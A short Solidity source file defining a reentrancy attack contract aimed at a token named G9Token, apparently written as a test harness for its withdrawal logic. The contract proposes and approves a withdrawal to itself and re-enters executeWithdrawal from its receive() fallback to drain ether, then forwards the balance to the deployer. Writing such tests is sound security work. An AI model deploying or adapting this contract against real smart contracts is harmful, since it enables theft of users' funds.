// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IG9Token {
    function proposeWithdrawal(uint256 amount, address recipient) external;
    function approveWithdrawal() external;
    function executeWithdrawal() external;
}

contract ReentrancyAttack {
    IG9Token public target;
    address public attacker;

    constructor(address _target) {
        target = IG9Token(_target);
        attacker = msg.sender;
    }

    // Attack fallback
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.executeWithdrawal(); // malicious reentrant call
        }
    }

    function attack() external {
        target.proposeWithdrawal(1 ether, address(this));
        target.approveWithdrawal();
        target.approveWithdrawal(); // simulate 2 approvals
        target.executeWithdrawal(); // attempt reentrancy
    }

    function withdraw() external {
        payable(attacker).transfer(address(this).balance);
    }
}
